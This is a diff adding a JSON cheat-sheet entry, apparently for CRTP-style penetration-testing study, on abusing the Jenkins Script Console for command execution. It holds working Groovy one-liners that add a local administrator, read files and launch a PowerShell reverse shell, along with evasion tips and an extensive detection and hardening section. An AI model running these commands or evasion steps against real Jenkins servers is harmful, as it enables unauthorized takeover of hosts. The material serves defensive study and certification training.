@@ -1,0 +1,102 @@
+{
+  "id": "crtp-jenkins-abuse",
+  "name": "Jenkins Groovy Script Console RCE",
+  "command": "println 'whoami'.execute().text",
+  "description": "Abuse Jenkins Script Console (Groovy) to execute OS commands. Jenkins often runs as SYSTEM or a service account with domain privileges.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Local PrivEsc",
+  "type": "command",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1059.007",
+    "T1505.003"
+  ],
+  "tools": [
+    "Jenkins"
+  ],
+  "tags": [
+    "jenkins",
+    "groovy",
+    "rce",
+    "privesc",
+    "service-account"
+  ],
+  "steps": [
+    {
+      "label": "Navigate to script console",
+      "command": "http://<ip>:8080/script"
+    },
+    {
+      "label": "Test RCE",
+      "command": "println 'whoami'.execute().text"
+    },
+    {
+      "label": "Add user to local admins",
+      "command": "def proc = ['cmd','/c','net localgroup administrators <user> /add'].execute()\nprintln proc.text"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Test code execution",
+      "command": "println 'whoami'.execute().text"
+    },
+    {
+      "label": "Read sensitive file",
+      "command": "println new File('C:\\\\Windows\\\\win.ini').text"
+    },
+    {
+      "label": "Add user to Administrators",
+      "command": "def proc = ['cmd','/c','net localgroup administrators jdoe /add'].execute()\nprintln proc.text"
+    },
+    {
+      "label": "PowerShell reverse shell",
+      "command": "def cmd = 'powershell -enc BASE64ENCODEDPAYLOAD'\ndef proc = cmd.execute()\nprintln proc.text"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Dump credentials from compromised host",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-powerup",
+      "note": "Run PowerUp for additional local privesc vectors",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-psremoting",
+      "note": "Use service account credentials for lateral movement",
+      "rel": "next"
+    }
+  ],
+  "notes": "Jenkins often runs as SYSTEM or a privileged service account. Script console allows unrestricted OS command execution.",
+  "references": [
+    {
+      "title": "CRTP - Jenkins Abuse",
+      "url": "https://www.alteredsecurity.com/adlab"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Jenkins' Script Console (at /script) provides an unauthenticated or poorly-authenticated Groovy REPL that executes code in the JVM as the Jenkins service account. Groovy's Runtime.exec() allows direct OS command execution. If Jenkins runs as SYSTEM or a domain service account, this becomes immediate code execution with those privileges. Many Jenkins deployments are accessible to all authenticated users or even anonymously.",
+    "prerequisites": "Network access to Jenkins web interface. Access to /script endpoint (admin rights, or anonymous/all-users access enabled). Groovy code execution capability not disabled.",
+    "impact": "T1059.007 Command and Scripting Interpreter: JavaScript (Groovy JVM) + T1505.003 Server Software Component: Web Shell. OS-level command execution as Jenkins service account. If Jenkins runs as SYSTEM or domain service account, immediate PrivEsc or lateral movement. Build credentials stored in Jenkins credential store are also accessible.",
+    "detection": "Event 4688: unexpected child process of java.exe (cmd.exe, powershell.exe). Sysmon Event 1: java.exe spawning cmd.exe. Jenkins audit log: Groovy script console access events. Web server access log: POST to /script endpoint from unexpected user. Network: outbound reverse shell connection from Jenkins server.\nScripting interpreters (powershell.exe, cmd.exe, wscript.exe) executing outside expected time windows or from abnormal user contexts (DET0516).\nShell interpreters (bash, sh, python, perl) initiated by unexpected users or processes chaining netcat/curl/ssh.\nmacOS scripting launched via Terminal/Automator/hidden osascript with unusual parent process.\nESXi busybox shell spawned from SSH unexpectedly; network device CLI from uncommon accounts or unknown IPs.",
+    "artifacts": "Event 4688: cmd.exe/powershell.exe as child of java.exe | Sysmon Event 1: jenkins process spawning OS commands | Jenkins audit.log: script console use | Web access log: POST /script | Network: outbound connection to attacker from Jenkins host",
+    "prevention": "Disable the Script Console for non-admin users (Manage Jenkins \u2192 Security \u2192 disable script console for users). Enable Jenkins security (not anonymous access). Run Jenkins as a dedicated low-privilege service account (not SYSTEM). Segment Jenkins from the domain \u2014 it shouldn't have domain credentials or access production systems. Review credentials stored in Jenkins Credential Store. Deploy WAF to block /script endpoint from unauthorized sources.\nAntivirus/Antimalware: Auto-quarantine of malicious scripting interpreter activity.\nAudit: Inventory interpreter usage to detect unexpected scripting binaries.\nBehavior Prevention on Endpoint: Windows 10 ASR rules blocking VBScript and JScript execution.\nCode Signing: Permit only signed scripts; block unsigned interpreter executions.\nDisable or Remove Feature or Program: Remove unused shells and scripting interpreters.\nExecution Prevention: Application control (WDAC/AppLocker); PowerShell Constrained Language Mode (restrict Add-Type).\nPrivileged Account Management: Restrict PowerShell execution policy to admins; use PowerShell Just Enough Administration (JEA).\nRestrict Web-Based Content: Script-blocking browser extensions and ad blockers.",
+    "evasion": "Use Build pipelines instead of direct script console (groovy runs in build steps, harder to audit). Exfiltrate credentials from Jenkins secrets store instead of spawning processes. Use Java reflection to execute code without directly calling Runtime.exec (bypass process spawn detection).",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1059/007/",
+      "https://attack.mitre.org/techniques/T1505/003/"
+    ],
+    "misconfiguration": "Jenkins Script Console accessible to non-admin users or anonymously. Jenkins runs as SYSTEM or domain admin. Jenkins has domain credentials in its store. No audit logging of script console usage. Jenkins accessible from workstations without WAF.",
+    "vulnerable_config": "# Jenkins running as SYSTEM (check service account):\nGet-WmiObject Win32_Service -Filter {Name='Jenkins'} | Select-Object Name,StartName\n# StartName: LocalSystem = SYSTEM = CRITICAL\n\n# Script Console accessible to all authenticated users:\n# Manage Jenkins \u2192 Global Security \u2192 Authorization:\n# \u2192 'Logged-in users can do anything' = Script Console open to all\n\n# Anonymous read access enabled (even worse):\n# Allow anonymous read access: True \u2192 Script Console publicly accessible",
+    "secure_config": "# Run Jenkins as dedicated low-privilege account:\n# Services \u2192 Jenkins \u2192 Log On \u2192 This account \u2192 svc_jenkins\n# svc_jenkins: no local admin, no domain rights, no RDP\n\n# Restrict Script Console to Jenkins administrators only:\n# Manage Jenkins \u2192 Security \u2192 Enable Jenkins' own user database\n# \u2192 Project-based Matrix Authorization Strategy\n# \u2192 Only admin group has Administer permission\n\n# Block /script from non-admin hosts via reverse proxy (nginx):\n# location /script {\n#   allow 10.0.100.0/24;  # Admin VLAN only\n#   deny all;\n# }\n\n# Disable Script Console entirely if not needed:\n# Jenkins \u2192 Plugin Manager: install 'Script Security' plugin to sandbox Groovy\n\n# Sysmon rule:\n# Event 1: ParentImage contains 'java.exe' AND Image contains 'cmd.exe' \u2192 ALERT"
+  }
+}
